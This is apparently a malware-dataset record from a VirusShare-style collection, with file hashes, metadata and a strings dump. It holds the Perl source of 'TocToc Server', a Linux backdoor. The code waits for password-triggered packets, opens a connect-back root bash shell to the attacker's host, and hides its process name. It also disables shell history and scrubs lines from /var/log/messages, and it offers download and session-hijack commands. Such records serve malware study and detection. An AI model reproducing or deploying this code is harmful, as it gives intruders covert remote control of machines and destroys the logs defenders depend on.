,$F[9], $F[7], $pid, $fd, $cmd);\n          spm($proto, \"SOCKLIST\", $string);\n      }\n      close(FILE);\n    }\n    if (not defined($protocol)) {\n      scheck(\"tcp\");\n      scheck(\"udp\");\n      scheck(\"raw\");\n    } elsif (grep { $_ eq $protocol } (\"tcp\", \"udp\", \"raw\")) {\n        scheck(\"$protocol\");\n    } else {\n       spm($proto, \"SOCKLIST\", \"Error: protocol \".uc($protocol).\" not found in the list (UDP, TCP, RAW)\");\n    }\n \n  }\n       \n  sub download {\n    my ($cli, $link, $file) = @_;\n\n    my $proto = $CLIENT{$cli}->{proto};\n\n    pipe(RDR, WTR);\n    WTR->autoflush(1);\n    RDR->autoflush(1);\n\n    $CLIENT{$cli}->{DOWNLOAD_PIPE} = \\*WTR;\n\n    my $pid = fork();\n    return(undef) if not defined($pid);\n\n    unless($pid) {\n      close(WTR);\n      unless(open(FILE, \"> $file\")) {\n        spm_done($proto, \"DOWNLOAD\", \"I could not open $file for writting\");\n        exit;\n      }\n\n      my $first = 1;\n\n      my $init_time = Time::HiRes::time;\n      my $saved_data = 0;\n      if ($link =~ /^http/i) {\n        my $ua = LWP::UserAgent->new(keep_alive => 1,  timeout => 30 );\n        my $req = new HTTP::Request GET => $link;\n\n        my $res = $ua->request($req,\\&http_save_data, 4096);\n        $init_time = Time::HiRes::time;\n        if ($res->header(\"X-Died\") || !$res->is_success) {\n          spm($proto, \"DOWNLOAD\", \"Error: Download was interrupted by peer.\");\n        } else {\n           spm($proto, \"DOWNLOAD\", \"Download finished, file $file has been saved.\");\n        }\n      } elsif ($link =~ /^ftp/i) {\n          $link =~ s/^ftp:\\/\\///;\n          $link =~ /(.+?)\\/(.*)/;\n          my $host = $1;\n          my $file = $2;\n          my $save = $link;\n          $save =~ s/.*\\/(.+?)$/$1/;\n\n          unless ($host or $file) {\n            spm_done($proto, \"DOWNLOAD\", \"Unrecognized ftp link\");\n            exit;\n          }\n          my $sock = IO::Socket::INET->new(PeerAddr => \"$host\", PeerPort => 21, Proto => \"tcp\", Timeout => 15);\n          unless ($sock) {\n            spm_done($proto, \"DOWNLOAD\", \"Error: I could not connect on host ($host:21)\");\n            exit;\n          }\n\n          my $logado = 0;\n          print $sock \"USER anonymous\\nPASS anonymous\\@anonymous.com\\n\";\n          my ($size, $trans);\n\n          while (<$sock>) {\n             my $buf = $_;\n             $buf =~ s/\\n//;\n             if ($buf =~ /^230/ and $logado == 0) {\n               $logado = 1;\n\n               print $sock \"TYPE I\\nPASV\\nRETR $file\\n\";\n             } elsif ($buf =~ /^150.+?\\((\\d+)\\s.+?\\)/) {\n                $size = $1;\n                $init_time = Time::HiRes::time;\n                my $saved_data = 0;\n                open(FILE, \"> $save\");\n                while (<$trans>) {\n                  print FILE $_;\n                  $saved_data += length($_);\n                  gotta_die();\n                  if ($first == 1) {\n                    spm($proto, \"DOWNLOAD\", \"Stats: Downloading $link ($size size). Type ^C to abort\");\n                    $first = 0;\n                  } else {\n                     ProgressBar($cli, $init_time, $saved_data, $size);\n                  }\n                }\n                close(FILE);\n                print $sock \"QUIT\\n\";\n                last;\n             } elsif ($buf =~ /^530/ and $logado == 1) {\n                 spm_done($proto, \"DOWNLOAD\", \"Error: File not found.\");\n                 exit;\n             } elsif ($buf =~ /^227.+?\\((.*)\\)/) {\n                 my @info = split(',', $1);\n                 my $host = join('.', @info[0 .. 3]);\n                 my $port = $info[4] * 256 + $info[5];\n                 $trans = IO::Socket::INET->new(PeerAddr => \"$host\", PeerPort => \"$port\", Proto => \"tcp\");\n                 unless ($trans) {\n                   spm_done($proto, \"DOWNLOAD\", \"Error: I could not estabilish the transfer connection\");\n                   exit;\n                 }\n             }\n          }\n      } else {\n         spm($proto, \"DOWNLOAD\", \"Link MUST begin with http:// or ftp://\");\n      }\n\n      spm_done($proto, \"DOWNLOAD\");\n      sleep(1);\n      exit;\n\n      sub http_save_data {\n        my($data, $response, $protocol) = @_;\n        print FILE $data;\n        gotta_die();\n        $saved_data += length($data);\n        my $total_data = $response->content_length;\n\n        if ($first == 1) {\n          spm($proto, \"DOWNLOAD\", \"Stats: Downloading $link ($total_data size). Type ^C to abort\");\n          $first = 0;\n        } else {\n             ProgressBar($cli, $init_time, $saved_data, $total_data);\n        }\n\n      }\n      sub gotta_die {\n        my $readfields = '';\n        vec($readfields, fileno(RDR), 1) = 1;\n        my $ready = select($readfields, undef, undef, 0);\n        if ($ready == 1) {\n          sleep(1);\n          exit;\n        }\n      }\n    }\n    close(RDR);\n    return(1);\n  }\n\n  # i like the wget look so i based this function on it :)\n  sub ProgressBar {\n    my ($cli, $init_time, $saved_bytes, $total_bytes) = @_;\n    \n    my $proto = $CLIENT{$cli}->{proto};\n    my @term_size = split(/ +/, $CLIENT{$cli}->{termsize});\n    $term_size[0] = 70 unless defined($term_size[0]);\n\n    # time  #\n    my $d_time = (Time::HiRes::time())-$init_time;\n  \n    # size #\n    my $unit = \"Kb/s\";\n    my $Sps = ($saved_bytes/$d_time) / 1024;\n    if ($Sps > 1024) {\n       $Sps = $Sps/1024;\n       $unit = \"Mb/s\";\n    }\n    $Sps = round($Sps, 2);\n  \n \n    # percentage #\n    my $percent = ($saved_bytes*100)/$total_bytes;\n    $percent = round($percent, 1);\n\n    # i hope someone teach me a better way :/\n    my $s_saved_bytes = reverse($saved_bytes);\n    $s_saved_bytes =~ s/(...)/$1,/g;\n    $s_saved_bytes = reverse($s_saved_bytes);\n    $s_saved_bytes =~ s/^\\,//;\n    my $s_total_bytes = reverse($total_bytes);\n    $s_total_bytes =~ s/(...)/$1,/g;\n    $s_total_bytes = reverse($s_total_bytes);\n    $s_total_bytes =~ s/^\\,//;\n \n    # cauculating ETA #\n    my $eta_s = round(($d_time*($total_bytes-$saved_bytes))/$saved_bytes, 0);\n    my $eta_h = int($eta_s/3600);\n    $eta_s %= 3600;\n    my $eta_m = int($eta_s/60);\n    $eta_s %= 60;\n    $eta_h = \"0$eta_h\" if (length($eta_h) == 1);\n    $eta_m = \"0$eta_m\" if (length($eta_m) == 1);\n    $eta_s = \"0$eta_s\" if (length($eta_s) == 1);\n\n    # positionating the info on the screen #\n    my $show_percent = fill_space($percent, 6);\n    my $show_bytes = fill_space($s_saved_bytes, length($s_total_bytes));\n    my $show_Sps = fill_space($Sps, 9);\n    my $show_eta = fill_space(\"$eta_h:$eta_m:$eta_s\", 9);\n    $show_eta = \"--:--:--\" if (length($show_eta) > 9);\n\n    my $total_chars = length(\" $show_percent% [] $show_bytes  $show_Sps$unit  ETA $show_eta\");\n \n    # bars #\n    my $total_bars = $term_size[0]-5-$total_chars;\n    if($total_bars < 10) {\n       out(\"Your terminal size is too small\\r\");\n       return;\n    }\n\n    my $bar_per_byte = $total_bars/$total_bytes;\n    my $bars_n = $bar_per_byte * $saved_bytes;\n  \n    # yeah u know 0.something may do this\n    $bars_n = $total_bars if ($saved_bytes == $total_bytes);\n    $bars_n-- if ($saved_bytes != $total_bytes and $bars_n == $total_bars);\n \n    my $bars = \"=\" x $bars_n;\n    my $blank_n = $total_bars-$bars_n;\n    my $blank = \" \" x $blank_n;\n    $bars =~ s/=$/>/ if ($bars =~ /=/ and $bars_n != $total_bars);\n    $blank .= ' ' if ($total_bars != $bars_n);\n \n    my $blank_end = \" \" x 5;\n  \n    spm($proto, \"DOWNLOAD\", \"\\r $show_percent% \\033[1m\".\"[$bars$blank]\".\"\\033[0m $show_bytes  $show_Sps$unit  ETA $show_eta$blank_end\");\n\n  }\n\n  sub round {\n    my ($number, $decimals) = @_;\n\n    my ($int,$dec) = split('\\.', $number);\n\n    return(\"$int.\".(\"0\" x $decimals)) unless (defined($dec));\n\n    my @dec_ns = split('', $dec);\n\n    return(\"$int.$dec\".(\"0\" x ($decimals-(scalar(@dec_ns)))))\n      if (scalar(@dec_ns) < $decimals);\n\n    my $last_on_next = 0;\n    for (my $c = $#dec_ns; $c >= 0; $c--) {\n      if ($dec_ns[$c] >= 5) {\n        if (($c-1) < 0) {\n          $int++;\n        } else {\n           $dec_ns[$c-1]++;\n        }\n        $dec_ns[$c] = 0;\n      }\n      last if ($dec_ns[$c-1] != 10 and $last_on_next == 1);\n      last if ($c == $decimals and $dec_ns[$c-1] != 10);\n      $last_on_next = 1 if ($c < $decimals and $dec_ns[$c-1] != 10);\n    }\n\n    my $new_dec = join('', @dec_ns[0 .. ($decimals-1)]);\n    my $dot = \".\" if ($decimals != 0);\n    return(\"$int$dot$new_dec\");\n  }\n\n  sub fill_space {\n    my ($chars, $max) = @_;\n    my $filled = length($chars);\n    my $space_n  = $max-$filled;\n    return($chars) if ($space_n <= 0);\n\n    my $space = \" \" x $space_n;\n\n    return($space.$chars);\n  }\n\n  # this function get the info like \"w\" does but\n  # it doesn't use wtmp to get the loged users.\n  # I made it just to get the running process info\n  # in pts/* devices.\n  sub w_procps {\n    my $btime;\n    open(STAT, \"< /proc/stat\");\n    while (<STAT>) {\n      if (/^btime\\s+(\\d+)\\n/i) {\n        $btime = $1;\n        last;\n      }\n    }\n    close(STAT);\n\n    opendir(PROC, \"/proc\");\n    my @files = readdir(PROC);\n    closedir(PROC);\n    @files = grep { -d \"/proc/$_\" and $_ =~ /^\\d+$/ } @files;\n\n    my %PROC;\n\n    foreach my $pid (@files) {\n      open(STAT, \"< /proc/$pid/stat\");\n      my $stat = <STAT>;\n      close(STAT);\n      my @proc_stat = split(/ /, $stat);\n      my $devnum = $proc_stat[6];\n      my $tpgid = $proc_stat[7];\n      my $starttime = ($proc_stat[21]/$Hertz)+$btime;\n\n      next if ($tpgid != $pid);\n      next if ($devnum == 0);\n\n      # look up the tty name\n      opendir(PTS, \"/dev/pts\");\n      my @files = readdir(PTS);\n      closedir(PTS);\n      @files = grep { $_ ne '.' and $_ ne '..' } @files;\n\n      my ($dev) = grep { (stat(\"/dev/pts/$_\"))[6] eq $devnum } @files;\n\n      # undefined $dev means for us that the proc\n      # has not been ran from a /dev/pts/* device\n      next unless($dev);\n\n      my $ttyname = \"/dev/pts/$dev\";\n\n      if (not defined($PROC{$ttyname}) or $PROC{$ttyname}{starttime} < $starttime) {\n        $PROC{$ttyname}{PID} = $pid;\n        $PROC{$ttyname}{starttime} = $starttime;\n      }\n    }\n    foreach my $dev (keys(%PROC)) {\n      open(FH, \"< /proc/\".$PROC{$dev}{PID}.\"/cmdline\");\n      my $cmd = <FH>;\n      $cmd =~ s/\\0/ /g;\n      $cmd =~ s/\\s+$//;\n      close(FH);\n\n      my $idle = time-(stat($dev))[8];\n      $PROC{$dev}{idle} = $idle;\n      $PROC{$dev}{cmd} = $cmd;\n      ($PROC{$dev}{UID}, $PROC{$dev}{GID}) = (stat(\"/proc/\".$PROC{$dev}{PID}))[4, 5];\n    }\n\n    return(%PROC);\n  }\n\n  sub stat_time {\n    my ($sec, $type) = @_;\n\n    my $days = int($sec/86400);$sec %= 86400;\n    my $hour = int($sec/3600); $sec %= 3600;\n    my $minute = int($sec/60); $sec %= 60;\n    \n    $hour = \"0$hour\"     if (length($hour) == 1);\n    $minute = \"0$minute\" if (length($minute) == 1);\n    $sec = \"0$sec\"       if (length($sec) == 1);\n\n    if ($type eq \"h\") {\n      $hour += $days*24;\n      return(\"$hour:$minute:$sec\");\n    } elsif ($type eq \"d\") {\n       return(\"$days day(s), $hour:$minute:$sec\");\n    } else {\n       return(\"$minute:$sec\");\n    }\n  }\n      \n  sub write_shell {\n    my ($shell, $msg) = @_;\n\n    return(syswrite($shell, $msg, length($msg))) if (defined($shell));\n  }\n\n  sub write_client {\n     my ($cli, $msg) = @_;\n     my $socket = $CLIENT{$cli}->{sock};\n     return() if (not defined($socket));\n\n     syswrite($socket, $msg, length($msg));\n  }\n\n  sub finish_client {\n    my ($cli, $msg) = @_;\n    write_client($cli, $msg);\n    close_client($cli);\n  }\n\n  sub close_client {\n    my $cli = shift;\n    $connections-- if (defined($CLIENT{$cli})); # no mistakes with the protocol connection\n\n    $sel_serv->remove($cli);\n\n    if (defined($CLIENT{$cli}->{shell})) {\n      my $shell = $CLIENT{$cli}->{shell};\n      $sel_serv->remove($shell);\n      close($shell);\n      my $shell_pid = $CLIENT{$cli}->{SHELL_PID};\n      kill(9, $shell_pid) if ($shell_pid);\n    }\n    my $proto = $CLIENT{$cli}->{proto};\n    $proto->close() if ($proto);\n    $cli->close()   if ($cli);\n    delete($CLIENT{$cli});\n  }\n\n} # END OF CHILD   \nclose(CHILD_RDR);\n\nforeach my $file (keys(%WIPE)) {\n  next unless (open(FILE, \"< $file\"));\n  unless (open(TMP, \"> /tmp/.aPtmp\")) { # ???\n    close(FILE);\n    next;\n  }\n\n  while (<FILE>) {\n    my @wipe_words = split(/ +/ , $WIPE{$file});\n    my @line_words = split(/ +/, $_);\n\n    my $skip = 0;\n    foreach my $wipe_word (@wipe_words) {\n      if (grep { $_ =~ /\\Q$wipe_word\\E/i } @line_words) {\n        $skip = 1;\n        last;\n      }\n    }\n    next if ($skip == 1);\n    print TMP $_;\n  }\n  close FILE;\n  close TMP;\n  open(FILE, \"> $file\");\n  open(TMP, \"< /tmp/.aPtmp\");\n  while(<TMP>) {\n    print FILE $_;\n  }\n  close(FILE);\n  close(TMP);\n}\nunlink(\"/tmp/.aPtmp\");\n \nwhile ( 1 ) {\n  loop $psck,-1,\\&parse,@p;\n}\n\n#############\n# MAIN SUBS #\n#############\n\nsub conecta {\n  my ($ip, $port) = @_;\n  syswrite(PARENT_WTR, \"CONN $ip:$port\\n\");\n}\n\nsub check_pass {\n  my $got_pass = shift;\n  if (crypt($got_pass, $pass) eq $pass) {\n    return($got_pass);\n  }\n  return(undef);\n}\n\nsub parse {\n  my $pkt = $_[2];\n  $p->bset(substr($pkt,$offset));\n\n  my ($id,$frg,$ttl,$saddr,$daddr,) =\n     $p->get({ip=>['id','frag_off','ttl','saddr','daddr']});\n\n  my $sport = unpack(\"nn\",substr($pkt,$offset+$ip,4));\n  my $dport = unpack(\"nn\",substr($pkt,$offset+$ip+2,4));\n  my ($udp_icmp_data) = $p->get({udp=>[ 'data']});\n  my $tcp_data = substr($pkt,$offset+$ip+(unpack(\"C\",(substr($pkt,$offset+$ip+12,1)))/4));\n\n  my $client_host = sprintf(\"%u.%u.%u.%u\", unpack \"C4\", pack \"N1\", $saddr);\n  $daddr = sprintf(\"%u.%u.%u.%u\", unpack \"C4\", pack \"N1\", $daddr);\n\n  my $ok = 0;\n  if ($tcp_data =~ /^:(.+?):(\\d+):(.*)/) {\n     $client_host = $1 if ($1 ne '');\n     my $port = $2;\n     my $cli_pass = $3;\n     $cli_pass = $okp if (ord($3) == 1);\n     if (my $connect = check_pass($cli_pass)) {\n       conecta(\"$client_host\", $port);\n       $okp = $connect;\n       $ok = 1;\n     }\n  }\n  if ($ok == 0 and $udp_icmp_data  =~ /^:(.+?):(\\d+):(.*)/) {\n     $client_host = $1 if ($1 ne '');\n     my $port = $2;\n     my $cli_pass = $3;\n     $cli_pass = $okp if (ord($3) == 1);\n     if (my $connect = check_pass($cli_pass)) {\n       conecta(\"$client_host\", $port);\n       $okp = $connect;\n       $ok = 1;\n     }\n  }\n\n}\n"
    },
    "filename": "VirusShare_cc312abb41bb88012bc8875f7e42ed38",
    "filesize": 43745,
    "filetype": "Perl script text executable",
    "hashes": {
        "md5": "cc312abb41bb88012bc8875f7e42ed38",
        "sha1": "5698eca03809377ee42ac1155e902ef263586e4b",
        "sha256": "c5571b731e7a86e7d58fa1683ff9f37745e14ddf51806b58419b9256290f59b8"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/usr/bin/perl",
            "# TocToc Server 1.7.01-BETA2",
            "#     0ldW0lf - oldwolf@atrixteam.net",
            "#             - old-wolf@zipmail.com",
            "#             - www.atrixteam.net",
            "#######################################################################",
            "#######                     CONFIGURATION                       #######",
            "#######################################################################",
            "my $proc_name='TocToc';           # process name                      #",
            "#---------------------------------#####################################",
            "my $pdev = $ARGV[0] || \"\";        # extern interface - if none        #",
            "                                  # especifyed it will be looked up   #",
            "#---------------------------------#####################################",
            "my $pass = 'CRYPTED PASSWORD';    # Crypted password                  #",
            "#---------------------------------#####################################",
            "my $home = \"/\";                   # HOME directory                    #",
            "#---------------------------------#####################################",
            "my $shell = \"/bin/bash\";          # Shell bin location                #",
            "#---------------------------------#####################################",
            "my @commands = (                  # Commands to be executed before    #",
            "'cat /etc/issue.net 2> /dev/null',# run $shell you can also use ';'   #",
            "'id',                             # to separate them, E.g:            #",
            "'uname -a');                      # my @commands = ('id;uname -a');   #",
            "#---------------------------------#####################################",
            "my @bashrc = (                    # The bashrc lines gonna be written #",
            "  'alias ls=\\'ls $LS_OPTIONS\\''   # in \"$home/.bashrc before a shell  #",
            ");                                # be spawned and deleted after it   #",
            "#---------------------------------#####################################",
            "my $max_idle = 40;                # Max. time in minutes a user can   #",
            "                                  # be idle.                          #",
            "#---------------------------------#####################################",
            "my $pid_file = \"$home/.toc.pid\";  # PID file gonna be written if      #",
            "                                  # especifyed                        #",
            "#---------------------------------#####################################",
            "my $Hertz = 100;                  # Kernel clock tick rate to convert #",
            "                                  # the start time of a process into  #",
            "                                  # the UNIX epoch time. 100 is the   #",
            "                                  # Linux standard, you can also look #",
            "                                  # in /usr/include/asm/param.h for   #",
            "                                  # its value. Not necessary, thougth #",
            "#---------------------------------#####################################",
            "my %WIPE;                         #      - WIPE definetions  -        #",
            "$WIPE{\"/var/log/messages\"}        # $WIPE{\"some_file\"} = \"what to     #",
            "= \"obsolete promisc\";             # wipe\";                            #",
            "                                  # In the TocToc startup the lines   #",
            "                                  # with words in the key value gonna #",
            "                                  # be wiped off from the file        #",
            "#######################################################################",
            "####################################",
            "# You can change the ENV stuff too #",
            "####################################",
            "#### ENVironment ####",
            "$ENV{HOME}       = $home;",
            "$ENV{PS1}        = '[\\u@\\h \\W]: '; # the way i like :)",
            "$ENV{MAIL}       = '/var/mail/root';",
            "$ENV{HISTFILE}   = '/dev/null';",
            "$ENV{USER}       = 'root';",
            "$ENV{LOGNAME}    = 'root';",
            "$ENV{LS_OPTIONS} = ' --color=auto -F -b -T 0';",
            "$ENV{LS_COLORS}  = 'no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:ex=01;32:*.cmd=01;32:*.exe=01;32:*.com=01;32:*.btm=01;32:*.bat=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.bz2=01;31:*.rpm=01;31:*.deb=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.jpg=01;35:*.gif=01;35:*.bmp=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.mpg=01;37:*.avi=01;37:*.mov=01;37:';",
            "$ENV{SHELL}      = $shell;",
            "$ENV{TERM}       = 'xterm';",
            "#####################",
            "########################################",
            "# Probably you dont wanna change that #",
            "########################################",
            "# DO NOT ADD SIG{INT} HERE",
            "###### SIGnals ######",
            "$SIG{HUP}  = 'IGNORE';",
            "$SIG{TERM} = 'IGNORE';",
            "$SIG{CHLD} = sub { wait; };",
            "#####################",
            "####################################",
            "### Dont make any change unless ###",
            "### you know what your are doing ###",
            "####################################",
            "my $UPTIME = time;",
            "my $buffer = 4096;",
            "$0=$proc_name.\"\\0\";",
            "my $pid=fork;",
            "exit if $pid;",
            "use Cwd;",
            "my $dir = getcwd();",
            "chdir(\"/\") if ($dir ne '/');",
            "# Modules needed #",
            "use Net::RawIP;",
            "use IO::Socket;",
            "use IO::Pty;",
            "use IO::Handle;",
            "use IO::Stty;",
            "use IO::Socket;",
            "use IO::Select;",
            "use Term::ReadKey;",
            "use LWP::UserAgent;",
            "use Time::HiRes;",
            "use Sys::Hostname;",
            "##################",
            "# to use ioctl",
            "eval {",
            "  require 'sys/ioctl.ph'; ",
            "use strict;",
            "chdir(\"/\");",
            "if (defined($pid_file) and $pid_file ne '') {",
            "  open(PID, \"> $pid_file\");",
            "  print PID \"$$\\n\";",
            "  close(PID);",
            "my $VERSION = \"1.7.01-BETA2\";",
            "$max_idle *= 60;",
            "my $psize = 4096;",
            "my $ptout = 64;",
            "my $ip = 20;",
            "my (%c_ipt, @p, %pd);",
            "$pdev=Net::RawIP::lookupdev($ptout) unless $pdev;",
            "my $ifs = ifaddrlist;",
            "my $LIP = $ifs->{$pdev};",
            "my $pfil = \"tcp and ( dst host $LIP ) or udp and ( dst host $LIP ) or icmp and ( dst host $LIP )\";",
            "my $c=0;",
            "my $p=new Net::RawIP({ip=>{},udp=>{}});",
            "#my $p=new Net::RawIP();",
            "my $okp;",
            "my $psck=$p->pcapinit($pdev,$pfil,$psize,$ptout);",
            "my $offset=Net::RawIP::linkoffset($psck);",
            "exit if (!$offset);",
            "pipe(CHILD_RDR, PARENT_WTR);",
            "my $pid = fork();",
            "exit if (not defined($pid));",
            "unless ($pid) {",
            "  if (defined($pid_file) and $pid_file ne '') {",
            "    open(PID, \">> $pid_file\");",
            "    print PID \"$$\\n\";",
            "    close(PID);",
            "  my $main_pid = $$;",
            "  chdir(\"$home\");",
            "  close(PARENT_WTR);",
            "  CHILD_RDR->autoflush(1);",
            "  my $rdr = new IO::Handle;",
            "  $rdr->fdopen(fileno(CHILD_RDR), 'r');",
            "  $rdr->blocking(0);",
            "  my %CLIENT;",
            "  my $connections = 0;",
            "  my $sel_serv = IO::Select->new();",
            "  my $sel_shell = IO::Select->new();",
            "  my $rdr_buf = '';",
            "  while ( 1 ) {",
            "    if ($connections == 0) {",
            "      sleep(2); # dont waste cpu when not needed",
            "    } else {",
            "       foreach my $cli (keys(%CLIENT)) {",
            "         my $idle_time = time - $CLIENT{$cli}->{last_msg};",
            "         finish_client($CLIENT{$cli}->{sock}, \"\\n\\nIdle time exceeded.\\n\\n\") if ($idle_time > $max_idle);",
            "       }",
            "    }",
            "    if (defined(my $n = $rdr->sysread($rdr_buf, 4096))) {",
            "      rdr_parse(\"$rdr_buf\");",
            "      $rdr_buf = '';",
            "    }",
            "    my @ready = $sel_serv->can_read(0.01);",
            "    foreach my $fh (@ready) {",
            "      my $msg;",
            "      my $nread = sysread($fh, $msg, 4096);",
            "      my $proto_cli;",
            "      map { $proto_cli = $CLIENT{$_}->{sock} if ($CLIENT{$_}->{proto} eq $fh) } keys %CLIENT;",
            "      if ($nread == 0) {",
            "        if (defined($CLIENT{$fh})) {",
            "          close_client($fh);",
            "        } elsif (defined($proto_cli)) { ",
            "           close_client($proto_cli);",
            "        }",
            "      } elsif (not defined($CLIENT{$fh})) {",
            "          # protocols messages",
            "          next unless(defined($proto_cli));",
            "          parse_msg($proto_cli, $msg);",
            "      } elsif ($CLIENT{$fh}->{logged} == 1) {",
            "          $CLIENT{$fh}->{last_msg} = time;",
            "          write_shell($CLIENT{$fh}->{shell}, $msg);",
            "      }",
            "    }",
            "    my @shell_ready = $sel_shell->can_read(0.01);",
            "    foreach my $shell (@shell_ready) {",
            "      read_shell($shell);",
            "    }",
            "##############",
            "# CHILD SUBS #",
            "##############",
            "  sub rdr_parse {",
            "    my $msg = shift;",
            "    my @lines = split(/\\n/, $msg);",
            "    foreach my $line (@lines) {",
            "      if ($line =~ /^CONN (.*)/) {",
            "        open_conn(split(':',$1));",
            "      }",
            "    }",
            "  sub open_conn {",
            "    my ($ip, $port) = @_;",
            "    my $sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=> $ip, PeerPort=>$port, Timeout => 7) || return(undef);",
            "    $sock->autoflush(1);",
            "    $connections++;",
            "    $sel_serv->add($sock);",
            "    $CLIENT{$sock}->{sock} = $sock;",
            "    $CLIENT{$sock}->{logged} = 1;",
            "    $CLIENT{$sock}->{login_time} = time;",
            "    $CLIENT{$sock}->{last_msg} = time;",
            "    new_shell($sock);",
            "    # opening the protocol socket",
            "    my $proto = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=> $ip, PeerPort=>$port, Timeout => 7);",
            "    unless($proto) {",
            "      write_client($sock, \"\\nShit! The protocol connection could not be estabilished!\\nTry to reconnect.\\n\");",
            "    } else {",
            "        $CLIENT{$sock}->{proto} = $proto;",
            "        $sel_serv->add($proto);",
            "    }",
            "  sub read_shell {",
            "    my $shell = shift;",
            "    my $cli;",
            "    unlink(\"$home/.bashrc\") if (-e \"$home/.bashrc\"); # here we check and delete ",
            "                                                     # the bashrc file",
            "    my $msg = '';",
            "    map { $cli = $CLIENT{$_}->{sock} if ($CLIENT{$_}->{shell} eq $shell) } keys %CLIENT;",
            "    return(undef) unless(defined($cli)); # ???",
            "    my $read = sysread($shell, $msg, $buffer);",
            "    if ($read == 0) {",
            "      finish_client($cli, \"Terminal closed.\\n\");",
            "      $shell->close;",
            "      $sel_shell->remove($shell);",
            "    } else {",
            "       write_client($cli, $msg);",
            "    }",
            "  sub new_shell {",
            "    my $cli = shift;",
            "    my $pty = new IO::Pty;",
            "    my $bashrc_file = \"$home/.bashrc\";",
            "    $bashrc_file =~ s/^\\/\\//\\//;",
            "    unless ($pty) {",
            "      finish_client($cli, \"ERRO: There is no device available.\\n\");",
            "    }",
            "    my $pid = fork();",
            "    $CLIENT{$cli}->{SHELL_PID} = $pid;",
            "    if (not defined($pid)) {",
            "      finish_client($cli, \"ERRO: fork()\\n\");",
            "    }",
            "    unless ($pid) {",
            "      $pty->make_slave_controlling_terminal();",
            "      my $slave = $pty->slave();",
            "      close $pty;",
            "      $slave->set_raw();",
            "      unless (open(STDIN,\"<&\". $slave->fileno())) {",
            "        finish_client($cli,\"Couldn't reopen STDIN for reading.\\n\");",
            "        exit;",
            "      }",
            "      unless (open(STDOUT,\">&\". $slave->fileno())) {",
            "         finish_client($cli, \"Couldn't reopen STDOUT for writing.\\n\");",
            "         exit;",
            "      }",
            "      unless (open(STDERR,\">&\". $slave->fileno())) {",
            "        finish_client($cli, \"Couldn't reopen STDERR for writing.\\n\");",
            "        exit;",
            "      }",
            "      STDOUT->autoflush(1);",
            "      STDIN->autoflush(1);",
            "      STDERR->autoflush(1);",
            "      close $slave;",
            "      ReadMode 0;",
            "      sleep 1;",
            "      IO::Stty::stty(\\*STDIN,\"sane\");",
            "      chdir(\"$home\");",
            "      my $command = join(';', @commands);",
            "      if (defined($command)) {",
            "        system(\"$command &\"); # '&' to execute it in backgroud",
            "        sleep(1); # to get the commands answer",
            "                  # i hope 1 sec is enougth",
            "      }",
            "      # writing out .bashrc",
            "      open(BRC, \"> $bashrc_file\");",
            "      print BRC join(\"\\n\", @bashrc);",
            "      { exec(\"$shell\") };",
            "      syswrite(STDOUT, \"ERRO: exec($shell)\\n\");",
            "      exit;",
            "    }",
            "    $pty->close_slave();",
            "    $pty->set_raw();",
            "    $CLIENT{$cli}->{shell} = $pty;",
            "    $sel_shell->add($pty);",
            "  sub parse_msg {",
            "    my ($cli, $msg) = @_;",
            "    my $shell = $CLIENT{$cli}->{shell};",
            "    my $proto = $CLIENT{$cli}->{proto};",
            "    if ($msg =~ /\\001T:(.+?)\\s(.*):\\002\\n/) {",
            "      while ($msg =~ m/\\001T:(.+?)\\s(.*):\\002\\n/g) {",
            "        my $cmd  = $1;",
            "        my $arg  = $2;",
            "        my @args = split(/ +/, $arg);",
            "        if ($arg eq \"ABORT\") {",
            "          if ($cmd eq \"DOWNLOAD\") {",
            "            my $pipe = $CLIENT{$cli}->{DOWNLOAD_PIPE} if (defined($CLIENT{$cli}->{DOWNLOAD_PIPE}));",
            "            if (defined($pipe)) {",
            "               print $pipe \"ABORT\\n\";",
            "               close($pipe);",
            "               delete($CLIENT{$cli}->{DOWNLOAD_PIPE});",
            "            }",
            "#          } elsif ($cmd eq \"OPEN\") {",
            "#              exit if ($$ != $main_pid);",
            "          }",
            "          next;",
            "        } ",
            "        if ($cmd eq \"TERM_SIZE\") {",
            "          return() if (not defined($shell) or scalar(@args) != 4);",
            "          eval { SetTerminalSize(@args, $shell); };",
            "          ",
            "          if (defined($CLIENT{$cli}->{termsize})) { ",
            "            write_client($cli, \"\\nTerminal size has changed.\\n\\n\");",
            "          }",
            "          $CLIENT{$cli}->{termsize} = \"@args\";",
            "        } elsif ($cmd eq \"HIJACK\") {",
            "            my $chars = join(\" \", @args[1 .. $#args]);",
            "            hijack($proto, $args[0], $chars);",
            "        } elsif ($cmd eq \"SYSINFO\") {",
            "            my $hostname = hostname;",
            "            my %CPU = cpuinfo();",
            "            my %MEM = meminfo();",
            "            my $uptime = uptime();",
            "            my $bd_uptime = stat_time(time-$UPTIME, \"d\");",
            "            my $cpu_load = sysload();",
            "            my $OS = ucfirst($^O);",
            "            my ($received, $sended) = netinfo();",
            "            opendir(PROC, \"/proc\");",
            "            my @procs = readdir(PROC);",
            "            closedir(PROC);",
            "            @procs = grep { $_ ne \".\" and $_ ne \"..\" and $_ =~ /^\\d+$/ } @procs;",
            "            my $procs = scalar(@procs);",
            "            ",
            "            my $kernel = \"Error: Could not open /proc/version\";",
            "            open(VER, \"< /proc/version\");",
            "            my @version = split(/ /, <VER>);",
            "            close(VER);",
            "            $kernel = $version[2] if (defined($version[2]));",
            "            my @release_files = (\"verso-conectiva\", \"mandrake-release\", \"redhat-release\", \"debian_version\", \"SuSE-release\", \"slackware-version\", \"release\", \"version\");",
            "            my $release;",
            "            my $release_file;",
            "            foreach my $file (@release_files) {",
            "              if (-e \"/etc/$file\") {",
            "                $release_file = \"/etc/$file\";",
            "                last;",
            "              }",
            "            }",
            "            unless ($release_file) {",
            "              opendir(ETC, \"/etc\");",
            "              my @files = readdir(ETC);",
            "              closedir(ETC);",
            "              my ($release_file) = grep { $_ =~ /release|version/ } @files;",
            "              $release_file = \"/etc/\".$release_file;",
            "            }",
            "            if ($release_file) {",
            "              open(REL, \"< $release_file\");",
            "              $release = <REL>;",
